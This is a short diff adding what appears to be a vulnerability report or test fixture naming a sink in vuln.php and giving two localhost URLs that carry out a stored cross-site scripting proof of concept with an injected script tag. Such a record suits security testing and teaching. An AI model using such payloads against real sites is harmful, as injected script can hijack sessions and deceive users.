@@ -1,0 +1,4 @@
+sink vuln.php:15
+
+exploit (1) localhost:9000/insert.php?id=1337&value=<script>alert(1);</script>
+exploit (2) localhost:9000/vuln.php/?id=1337
